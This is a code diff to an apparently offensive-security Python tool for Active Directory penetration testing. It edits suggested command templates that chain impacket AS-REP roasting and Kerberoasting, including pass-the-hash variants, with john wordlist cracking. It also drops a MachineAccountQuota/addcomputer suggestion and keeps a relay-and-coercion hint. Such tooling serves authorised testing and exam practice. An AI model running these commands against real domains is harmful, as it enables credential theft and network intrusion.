@@ -402,12 +402,14 @@ def build_suggestions(s: Success, ip: str, hostname: str,
             e += [("kerbrute userenum",
                        f"kerbrute userenum --dc {qip} -d {qdom} "
                        f"/usr/share/seclists/Usernames/Names/names.txt"),
-                  ("AS-REP roast",
-                       f"impacket-GetNPUsers {qdom}/{quser}:{qpw} "
-                       f"-request -format hashcat -outputfile asrep.hash -dc-ip {qip}"),
-                  ("Kerberoast",
+                  ("AS-REP roast + crack",
+                       f"impacket-GetNPUsers {qdom}/{quser}:{qpw} -request "
+                       f"-outputfile asrep.hash -dc-ip {qip}  &&  "
+                       f"john --format=krb5asrep asrep.hash --wordlist={WORDLIST}"),
+                  ("Kerberoast + crack",
                        f"impacket-GetUserSPNs -request -dc-ip {qip} "
-                       f"{qdom}/{quser}:{qpw} -outputfile kerb.hash"),
+                       f"{qdom}/{quser}:{qpw} -outputfile kerb.hash  &&  "
+                       f"john --format=krb5tgs kerb.hash --wordlist={WORDLIST}"),
                   ("BloodHound",
                        f"bloodhound-python -u {quser} -p {qpw} -d {qdom} "
                        f"-dc {qfqdn} -ns {qip} -c All --zip"),
@@ -472,9 +474,10 @@ def build_suggestions(s: Success, ip: str, hostname: str,
             e += [("BloodHound [PtH]",
                        f"bloodhound-python -u {quser} --hashes :{ha} "
                        f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"),
-                  ("Kerberoast [PtH]",
+                  ("Kerberoast [PtH] + crack",
                        f"impacket-GetUserSPNs -request -dc-ip {qip} "
-                       f"-hashes :{ha} {qdom}/{quser} -outputfile kerb.hash")]
+                       f"-hashes :{ha} {qdom}/{quser} -outputfile kerb.hash  &&  "
+                       f"john --format=krb5tgs kerb.hash --wordlist={WORDLIST}")]
         elif proto == "ldap":
             e.append(("getTGT",
                        f"impacket-getTGT {qdom}/{quser} -hashes :{ha}"))
@@ -1953,7 +1956,6 @@ class NxcPlus:
             ("all delegation rights",         base + ["--find-delegation"]),
             ("password-not-required accounts",base + ["--password-not-required"]),
             ("adminCount=1 (protected)",      base + ["--admin-count"]),
-            ("MachineAccountQuota",           base + ["-M", "maq"]),
         ]
         print()
         print_info("[*]", f"AD enrichment — read-only LDAP checks on "
@@ -2048,19 +2050,14 @@ class NxcPlus:
                             f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass "
                             f"-usersfile users.txt  &&  john --format=krb5asrep asrep.hash --wordlist={WORDLIST}"))
 
-        # 3) advanced / exploit chains — only real NON-DC findings, clearly flagged
+        # 3) advanced — only REAL misconfigs, not defaults. MAQ=10 is the domain
+        #    default (fires on every box) so it's pure noise and intentionally
+        #    dropped. Unconstrained delegation on a NON-DC is a genuine finding.
         unc = found.get("unconstrained delegation") or []   # DC already filtered out upstream
         if unc:
             advanced.append(("unconstrained delegation on a NON-DC host — coerce a DC to auth "
                              f"to it, capture its TGT: {', '.join(u.split()[0] for u in unc[:5])}",
                              "impacket-ntlmrelayx + PetitPotam/printerbug  (exploit — run manually)"))
-        maq = found.get("MachineAccountQuota") or []
-        maq_val = next((x.split(":")[-1].strip() for x in maq if "Quota" in x), None)
-        if maq_val and maq_val.isdigit() and int(maq_val) > 0:
-            advanced.append((f"MachineAccountQuota={maq_val} — add-computer -> RBCD / noPac "
-                             f"(advanced; rarely the OSCP path)",
-                             f"impacket-addcomputer {cred}{chash} -dc-ip {dc_ip} "
-                             f"-computer-name 'FAKE$' -computer-pass 'Pass123!'"))
 
         if not primary and not advanced:
             return
